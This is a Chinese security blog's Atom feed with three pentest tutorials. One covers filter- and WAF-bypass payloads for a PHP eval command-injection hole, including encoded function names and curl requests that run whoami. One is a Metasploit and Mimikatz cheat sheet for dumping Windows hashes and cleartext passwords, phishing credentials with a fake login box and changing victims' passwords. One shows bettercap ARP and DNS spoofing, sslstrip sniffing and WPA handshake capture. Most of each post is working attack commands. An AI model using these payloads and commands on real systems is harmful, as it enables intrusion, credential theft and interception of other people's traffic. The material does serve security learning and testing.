<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Myths</title>
  <subtitle>Myt0&#39;s blog</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://myt0.com/"/>
  <updated>2019-03-03T09:57:13.062Z</updated>
  <id>http://myt0.com/</id>
  
  <author>
    <name>Myths</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>PHP命令执行时的WAF&amp;Filter绕过方法</title>
    <link href="http://myt0.com/2019/03/03/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8CWAF-Filter%E7%BB%95%E8%BF%87/"/>
    <id>http://myt0.com/2019/03/03/php命令执行WAF-Filter绕过/</id>
    <published>2019-03-03T08:53:43.000Z</published>
    <updated>2019-03-03T09:57:13.062Z</updated>
    
    <content type="html"><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>命令执行是非常危险的一种漏洞，会造成严重的信息泄露，还可能导致 getshell，本文介绍如何去绕过一些简单的防命令执行，仅仅提供一种思路，实际情况各有不同。<br>先来看一段存在命令执行漏洞的 php 代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/system|exec|passthru/'</span>, $_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'invalid syntax'</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">eval</span>($_GET[<span class="string">'code'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>第二行试图校验 system, exec, passthru 三个函数，但这明显是远远不够的，还有很多其他的函数可以执行命令，但这里让我们假设只有这三个，这个脚本运行于 CloudFlare WAF 之后，</p>
<h3 id="尝试读取-etc-passwd"><a href="#尝试读取-etc-passwd" class="headerlink" title="尝试读取/etc/passwd"></a>尝试读取/etc/passwd</h3><p>我们尝试请求/cfwaf.php?code=system(“cat /etc/passwd”); 这时 WAF 拒绝了我们的请求，我们可以假设是因为 /etc/passwd 这一重要文件引起，所以我们尝试修改为”cat /etc$u/passwd”，这时候由于存在 system 关键词，会输出’invalid syntax’，接下来考虑怎么样可以避免直接使用 system。</p>
<h3 id="php-字符串编码"><a href="#php-字符串编码" class="headerlink" title="php 字符串编码"></a>php 字符串编码</h3><p>\[0-7]{1-3}代表八进制</p>
<p>\x[0-9A-Fa-f]{1,2}代表 16 进制</p>
<p>\u{[0-9A-Fa-f]{1,2}}代表 Unicode 编码，通常实现为 UTF-8</p>
<p>并不是所有人都知道这么多表示字符串的语法，再加上 php 变量函数，这将会成为我们绕过 WAF 或者 filter 的瑞士军刀。</p>
<h3 id="php-变量函数"><a href="#php-变量函数" class="headerlink" title="php 变量函数"></a>php 变量函数</h3><p>php 支持通过变量调用函数，比如<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$var(args); </span><br><span class="line"><span class="string">"string"</span>(args);</span><br></pre></td></tr></table></figure></p>
<p>都可以当做函数调用。这也就意味着我们可以进行如下转化：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">system(<span class="string">"ls"</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">"system"</span>(<span class="string">"ls"</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">"\x73\x79\x73\x74\x65\x6d"</span>(<span class="string">"ls"</span>)</span><br></pre></td></tr></table></figure>
<p>第三种直接将 system 转为 16 进制来执行，这样我们做到了不直接使用 system。</p>
<p>这种技术并不是适用于所有函数，比如 echo, print, unset(), isset(), empty(), include, require 这种类函数语句是不能用上面这种方式代替的。</p>
<h3 id="不使用引号"><a href="#不使用引号" class="headerlink" title="不使用引号"></a>不使用引号</h3><p>代码修改为</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/system|exec|passthru|[\"\']/'</span>, $_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'invalid syntax'</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">eval</span>($_GET[<span class="string">'code'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以看到我们加入了单引号和双引号的判断，这就意味着我们上面那些语句都会触发过滤。<br>幸运的是，在 PHP 里，我们表示一个字符串并不一定要用引号，比如<br><code>$a = (string)foo;</code><br>接着我们尝试如下转换：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">"foo"</span>;</span><br><span class="line"><span class="keyword">echo</span> (string)<span class="string">"bar"</span>;</span><br><span class="line"><span class="keyword">echo</span> (string)hello;</span><br><span class="line"><span class="keyword">echo</span> (world);</span><br></pre></td></tr></table></figure>
<p>执行过后你会发现连 string 都没必要使用，直接用括号就可以转换。也就是说我们执行<code>(system)(ls);</code>是被允许的，但是我们不能用 system，所以尝试字符串拼接<code>(sy.(st).em)(ls);</code>。或者我们加两个参数，绕过对于 code 参数的检测<br><code>?a=system&amp;b=ls&amp;code=$_GET[a]($_GET[b])</code><br>也就是说我们可以通过字符串拼接和变量调用两种方式来绕过。</p>
<h3 id="get-defined-functions"><a href="#get-defined-functions" class="headerlink" title="get_defined_functions"></a>get_defined_functions</h3><p>get_defined_functions 返回一个数组，假设是$arr， 里面包含所有的内置和自定义函数。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$arr = get_defined_functions();</span><br><span class="line"><span class="comment"># 所有内置函数</span></span><br><span class="line">$arr[internal]</span><br><span class="line"><span class="comment"># 所有自定义函数</span></span><br><span class="line">$arr[user]</span><br></pre></td></tr></table></figure></p>
<p>比如我们尝试执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &apos;print_r(get_defined_functions()[internal]);&apos; | grep &apos;system&apos;</span><br></pre></td></tr></table></figure>
<p>即可知道 system 函数是第几个函数，我这里是第 503，所以绕过上面的过滤时就可以这样：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先找到system的位置</span></span><br><span class="line">curl <span class="string">'http://test/cfwaf.php?code=get_defined_functions()[internal]'</span> | grep <span class="string">'system'</span></span><br><span class="line"></span><br><span class="line">curl <span class="string">'http://test/cfwaf.php?code=get_defined_functions()[internal][503](whoami)'</span></span><br></pre></td></tr></table></figure>
<h3 id="字符数组"><a href="#字符数组" class="headerlink" title="字符数组"></a>字符数组</h3><p>在 php 中可以用数组的形式取到字符串的每一个字符，这样我们就可以先定义一个包含所有需要的字符的字符串，然后通过下标取到字符再拼接的方式构造出我们需要的字符串。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 相当于执行(system)(ls /tmp)</span></span><br><span class="line">php -r <span class="string">'$a="elmsty/ ";($a[3].$a[5].$a[3].$a[4].$a[0].$a[2])($a[1].$a[3].$a[-1].$a[-2].tmp)'</span></span><br></pre></td></tr></table></figure>
<p>这样在请求的时候我们可以取<strong>FILE</strong>路径名的字符来构造我们的 payload。</p>
<p>本文参考自 <a href="https://www.exploit-db.com/docs/46049" target="_blank" rel="external">https://www.exploit-db.com/docs/46049</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h3&gt;&lt;p&gt;命令执行是非常危险的一种漏洞，会造成严重的信息泄露，还可能导致 getshell，本文介绍如何去绕过一些简单的防命令执行，仅仅提供一种思路，
    
    </summary>
    
    
      <category term="security" scheme="http://myt0.com/tags/security/"/>
    
      <category term="php" scheme="http://myt0.com/tags/php/"/>
    
      <category term="bypass" scheme="http://myt0.com/tags/bypass/"/>
    
  </entry>
  
  <entry>
    <title>windows后渗透利用</title>
    <link href="http://myt0.com/2019/03/03/windows%E5%90%8E%E6%B8%97%E9%80%8F%E5%88%A9%E7%94%A8/"/>
    <id>http://myt0.com/2019/03/03/windows后渗透利用/</id>
    <published>2019-03-02T20:31:18.000Z</published>
    <updated>2019-03-03T09:59:11.434Z</updated>
    
    <content type="html"><![CDATA[<h2 id="获取-hash"><a href="#获取-hash" class="headerlink" title="获取 hash"></a>获取 hash</h2><h3 id="meterpreter"><a href="#meterpreter" class="headerlink" title="meterpreter"></a>meterpreter</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ meterpreter &gt; hashdump</span><br></pre></td></tr></table></figure>
<p>将 hash 值保存到文件中，然后用 john 破解：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=/root/Desktop/pass.txt --format=NT /root/Desktop/hashes.txt</span><br></pre></td></tr></table></figure>
<h3 id="hashdump"><a href="#hashdump" class="headerlink" title="hashdump"></a>hashdump</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ msf &gt; use post/windows/gather/hashdump</span><br><span class="line">$ msf post(hashdump) &gt; set session 2</span><br><span class="line">$ msf post(hashdump) &gt; exploit</span><br></pre></td></tr></table></figure>
<h3 id="smart-hashdump"><a href="#smart-hashdump" class="headerlink" title="smart_hashdump"></a>smart_hashdump</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ msf &gt; use post/windows/gather/smart_hashdump</span><br><span class="line">$ msf post(hashdump) &gt; set session 2</span><br><span class="line">$ msf post(hashdump) &gt; exploit</span><br></pre></td></tr></table></figure>
<h3 id="credential-collector"><a href="#credential-collector" class="headerlink" title="credential_collector"></a>credential_collector</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ msf &gt; use post/windows/gather/credentials/credential_collector</span><br><span class="line">$ msf post(credential_collector) &gt; set session 2</span><br><span class="line">$ msf post(credential_collector) &gt; exploit</span><br></pre></td></tr></table></figure>
<p>上面 4 种得到的都是 hash，需要破解，下面看看怎么直接得到明文密码。</p>
<h2 id="获取明文密码"><a href="#获取明文密码" class="headerlink" title="获取明文密码"></a>获取明文密码</h2><h3 id="sso-模块"><a href="#sso-模块" class="headerlink" title="sso 模块"></a>sso 模块</h3><p>实际上这一功能利用的是 Mimikatz 扩展。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use post/windows/gather/credentials/sso</span><br><span class="line">msf post(sso) &gt; set session 2</span><br><span class="line">msf post(sso) &gt; exploit</span><br></pre></td></tr></table></figure>
<h3 id="meterpreter-kiwi"><a href="#meterpreter-kiwi" class="headerlink" title="meterpreter kiwi"></a>meterpreter kiwi</h3><p>这也是用的 Mimikatz</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; load kiwi</span><br><span class="line">meterpreter &gt; creds_all</span><br></pre></td></tr></table></figure>
<h3 id="伪造登录框"><a href="#伪造登录框" class="headerlink" title="伪造登录框"></a>伪造登录框</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use post/windows/gather/phish_windows_credentials</span><br><span class="line">msf post(phish_windows_credentials) &gt; set session 2</span><br><span class="line">msf post(phish_windows_credentials) &gt; exploit</span><br></pre></td></tr></table></figure>
<p>这时候会伪造假冒的登录框，对方输入密码之后我们就可以得到了。</p>
<h2 id="更改目标密码"><a href="#更改目标密码" class="headerlink" title="更改目标密码"></a>更改目标密码</h2><h3 id="change-password"><a href="#change-password" class="headerlink" title="change_password"></a>change_password</h3><p>这种主要适用于你创建了一个新账号，但是对方账号策略强制在登录之前必须修改密码，否则你登录会报错：’System error 1907 has occurred’。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use post/windows/manage/change_password</span><br><span class="line">msf post(change_password) &gt; set smbuser raj</span><br><span class="line">msf post(change_password) &gt; set old_password 123</span><br><span class="line">msf post(change_password) &gt; set new_password 987</span><br><span class="line">msf post(change_password) &gt; set session 1</span><br><span class="line">msf post(change_password) &gt; exploit</span><br></pre></td></tr></table></figure>
<h3 id="net-user"><a href="#net-user" class="headerlink" title="net user"></a>net user</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meterepreter&gt; shell</span><br><span class="line">net user</span><br><span class="line">net user raj 123</span><br></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;获取-hash&quot;&gt;&lt;a href=&quot;#获取-hash&quot; class=&quot;headerlink&quot; title=&quot;获取 hash&quot;&gt;&lt;/a&gt;获取 hash&lt;/h2&gt;&lt;h3 id=&quot;meterpreter&quot;&gt;&lt;a href=&quot;#meterpreter&quot; class=&quot;he
    
    </summary>
    
    
      <category term="security" scheme="http://myt0.com/tags/security/"/>
    
      <category term="metasploit" scheme="http://myt0.com/tags/metasploit/"/>
    
  </entry>
  
  <entry>
    <title>中间人工具bettercap</title>
    <link href="http://myt0.com/2019/03/01/%E4%B8%AD%E9%97%B4%E4%BA%BA%E5%B7%A5%E5%85%B7bettercap/"/>
    <id>http://myt0.com/2019/03/01/中间人工具bettercap/</id>
    <published>2019-03-01T07:52:51.000Z</published>
    <updated>2019-03-02T12:50:37.182Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>bettercap 用于中间人攻击测试，并可以应用于 wifi 网络的一些测试。</p>
<p>官网：<a href="https://www.bettercap.org/" target="_blank" rel="external">https://www.bettercap.org/</a></p>
<p>项目地址：<a href="https://github.com/bettercap/bettercap" target="_blank" rel="external">https://github.com/bettercap/bettercap</a></p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>官网介绍的安装命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ go get github.com/bettercap/bettercap</span><br><span class="line">$ <span class="built_in">cd</span> <span class="variable">$GOPATH</span>/src/github.com/bettercap/bettercap</span><br><span class="line">$ make build &amp;&amp; sudo make install</span><br></pre></td></tr></table></figure>
<p>因为我用的 parrot 中默认自带了，所以我没有尝试过安装，如果 kali 中没有这一工具，貌似也可以 apt install 直接安装，如果不能就按照官网介绍的安装命令来吧。</p>
<h2 id="常见用法"><a href="#常见用法" class="headerlink" title="常见用法"></a>常见用法</h2><h3 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h3><p>bettercap 有两种用法：</p>
<ol>
<li>直接执行会进入交互式模式</li>
<li>非交互模式，命令<code>-caplet 文件</code>执行脚本文件，通过编写脚本可以组合复杂的攻击，或者<code>-eval 命令</code>直接执行命令内容。</li>
</ol>
<p><code>-h</code>输出帮助信息。</p>
<p><code>-iface 网卡</code>指定网卡对应的网络，比如 wlan0。</p>
<h3 id="内网发现"><a href="#内网发现" class="headerlink" title="内网发现"></a>内网发现</h3><p>进入交互模式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo bettercap -iface eth1</span><br></pre></td></tr></table></figure>
<p>展示网络情况</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net.show</span><br></pre></td></tr></table></figure>
<p>执行过后会展示被动发现的网络主机，但有些需要主动发现，使用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net.probe on</span><br></pre></td></tr></table></figure>
<p>启用主动发现之后会产生一系列数据包探测网络，接着重复<code>net.show</code>会看到新发现的网络主机。</p>
<p><code>ticker on</code>为定时器模块，可以重复执行命令，默认执行的命令是<code>clear; net.show</code>，所以我们执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo bettercap -iface eth1 -eval &quot;net.probe on;ticker on&quot;</span><br></pre></td></tr></table></figure>
<p>会开启内网探测，并重复刷新显示最新探测到的网络状况。</p>
<p>交互式模式下使用以下命令修改 ticker 执行的内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set ticker.commands &apos;command&apos;</span><br></pre></td></tr></table></figure>
<p>设置执行 ping 检测是否连接到外网：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set ticker.commands &apos;clear; net.show; !ping -c 1 google.com &gt;/dev/null 2&gt;&amp;1 &amp;&amp; echo &quot;Connected&quot; || echo &quot;Not connected&quot;&apos;</span><br></pre></td></tr></table></figure>
<p>设置执行间隔时间为 3 秒</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set ticker.period 3</span><br></pre></td></tr></table></figure>
<p>开启定时器：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ticker on</span><br></pre></td></tr></table></figure>
<p>使用命令模式一步执行上面的所有内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo bettercap -eval &apos;net.probe on; set ticker.commands &quot;clear; net.show; !ping -c 1 google.com &gt;/dev/null 2&gt;&amp;1 &amp;&amp; echo &quot;Connected&quot; || echo &quot;Not connected&quot;&quot;; set ticker.period 3; ticker on&apos;</span><br></pre></td></tr></table></figure>
<p>我们可以使用-caplet 参数，指定一个包含命令的 cap 文件来代替-eval，这样就不用每次都输入一大串命令。<br>新建一个 netmon.cap，内容如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">net.probe on</span><br><span class="line"># Note the absence of quotes in this example and the quotes in the previous ones:</span><br><span class="line">set ticker.commands clear; net.show; !ping -c 1 google.com &gt;/dev/null 2&gt;&amp;1 &amp;&amp; echo &quot;Connected&quot; || echo &quot;Not connected&quot;</span><br><span class="line">set ticker.period 3</span><br><span class="line">ticker on</span><br></pre></td></tr></table></figure>
<p>然后执行：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo better -caplet ./netmon.cap</span><br></pre></td></tr></table></figure>
<h3 id="欺骗和嗅探"><a href="#欺骗和嗅探" class="headerlink" title="欺骗和嗅探"></a>欺骗和嗅探</h3><p>开启 ARP 欺骗：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp.spoof on</span><br></pre></td></tr></table></figure>
<p>默认情况下，会对整个子网进行欺骗，所以通常我们要设置对应的 IP，而不是攻击所有主机：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set arp.spoof.targets 192.168.66.3</span><br></pre></td></tr></table></figure>
<p>要设置多个 IP 的话使用逗号间隔<br>接下来看看网络情况：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net.show</span><br></pre></td></tr></table></figure>
<p>在启动 ARP 欺骗之前一定要设置目标，如果要改变目标 IP，先停止欺骗:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">arp.spoof off</span><br><span class="line">set arp.spoof.targets 192.168.66.3</span><br><span class="line">arp.spoof on</span><br></pre></td></tr></table></figure>
<p>对于嗅探来说，如果嫌结果冗余，可以先精简结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set net.sniff.verbose false</span><br></pre></td></tr></table></figure>
<p>开启嗅探</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net.sniff on</span><br></pre></td></tr></table></figure>
<h3 id="HTTP-透明代理"><a href="#HTTP-透明代理" class="headerlink" title="HTTP 透明代理"></a>HTTP 透明代理</h3><p>要分析 HTTP 流量，必须开启 http.proxy。如果结合 sniff 模块，所有嗅探到的 HTTP 流量都会转到 http.proxy，这种情况下，它会自动设置端口转发。<br>如果你想使用 sslstrip，必须设置 http.proxy.sslstrip 为 true，默认为 false</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set http.proxy.sslstrip true</span><br></pre></td></tr></table></figure>
<p>开启 http proxy:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.proxy on</span><br></pre></td></tr></table></figure>
<p>下面以攻击 192.168.66.3 为例，首先开启 arp.spoof 让对方的所有流量转到攻击者的机器，然后开启 http.proxy，这样所有 http 流量转到代理模块，然后精简嗅探结果并开启嗅探，这样可以看到所有 sniff 到的重要信息。如果想看到 https，开启 http.proxy.sslstrip。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">set http.proxy.sslstrip true</span><br><span class="line">set net.sniff.verbose false</span><br><span class="line">set arp.spoof.targets 192.168.66.3</span><br><span class="line">arp.spoof on</span><br><span class="line">http.proxy on</span><br><span class="line">net.sniff on</span><br></pre></td></tr></table></figure>
<p>要攻击整个内网，省略 set arp.spoof.targets 这一句。</p>
<h3 id="DNS-欺骗"><a href="#DNS-欺骗" class="headerlink" title="DNS 欺骗"></a>DNS 欺骗</h3><p>使用 dns.spoof 模块可以实现 DNS 欺骗，默认情况会欺骗目标所有访问的域名。如果要指定欺骗的域名，执行：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set dns.spoof.domains myt0.com,google.com</span><br></pre></td></tr></table></figure>
<p>设置欺骗转向的地址，默认是本地地址：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set dns.spoof.address desired_IP</span><br></pre></td></tr></table></figure>
<p>默认只会回应那些对本地的请求，如果要回应任何请求，使用以下命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set dns.spoof.all true</span><br></pre></td></tr></table></figure>
<p>运行 dns spoof:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dns.spoof on</span><br></pre></td></tr></table></figure>
<h3 id="内置-webserver"><a href="#内置-webserver" class="headerlink" title="内置 webserver"></a>内置 webserver</h3><p>你也可以使用自带的 apache：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start apache2</span><br></pre></td></tr></table></figure>
<p>bettercap 内置一个简单的 web server, 首先设置 server 监听的目录：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set http.server.path /path/folder</span><br></pre></td></tr></table></figure>
<p>开启 http.server</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.server on</span><br></pre></td></tr></table></figure>
<h3 id="Wi-Fi-网络监听："><a href="#Wi-Fi-网络监听：" class="headerlink" title="Wi-Fi 网络监听："></a>Wi-Fi 网络监听：</h3><p>首先使用-iface 指定监听 wifi 网卡：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo bettercap -iface wlan0</span><br></pre></td></tr></table></figure>
<p>这个时候可能会出现报错：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Can&apos;t restore interface wlan0 wireless mode (SIOCSIWMODE failed: Bad file descriptor).</span><br><span class="line">Please adjust manually.</span><br></pre></td></tr></table></figure>
<p>这是因为需要将网卡开启混杂模式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sudo ip link set wlan0 down</span><br><span class="line">$ sudo iw wlan0 set monitor control</span><br><span class="line">$ sudo ip link set wlan0 up</span><br></pre></td></tr></table></figure>
<p>然后指定网卡启动之后，开启探测 wifi 网络：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wifi.recon on</span><br></pre></td></tr></table></figure>
<p>执行之后会看到探测的所有 wifi 网络。<br>如果你觉得结果太多，可以设置监听指定的频道：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wifi.recon.channel 1,2,3</span><br></pre></td></tr></table></figure>
<p>如果之后想监听所有频道，执行：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wifi.recon.channel clear</span><br></pre></td></tr></table></figure>
<p>然后显示 wifi 探测结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wifi.show</span><br></pre></td></tr></table></figure>
<p>接下来我们利用 ticker 展示最新探测到的 20 个 wifi：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set ticker.commands &apos;clear; wifi.show; net.show; events.show 20&apos;</span><br><span class="line">wifi.recon on</span><br><span class="line">ticker on</span><br></pre></td></tr></table></figure>
<h3 id="捕获握手数据包"><a href="#捕获握手数据包" class="headerlink" title="捕获握手数据包"></a>捕获握手数据包</h3><p>这里你需要理解当连接 wifi 的时候密码配对正确时会产生一个 handshake，里面包含 wifi 密码的密文，可以利用伪造的断网数据包使客户端与 AP（wifi 接入点）断开连接，然后客户端会自动重新连接，这个时候我们可能会捕获到 handshake。</p>
<p>首先简化输出结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set net.sniff.verbose true</span><br></pre></td></tr></table></figure>
<p>通过设置 handshake 的标志位过滤 handshake：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set net.sniff.filter ether proto 0x888e</span><br></pre></td></tr></table></figure>
<p>设置数据包存放路径：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set net.sniff.output /root/wpa.pcap</span><br></pre></td></tr></table></figure>
<p>开启嗅探：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net.sniff on</span><br></pre></td></tr></table></figure>
<p>设置 wifi 频道：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wifi.recon.channel 3</span><br></pre></td></tr></table></figure>
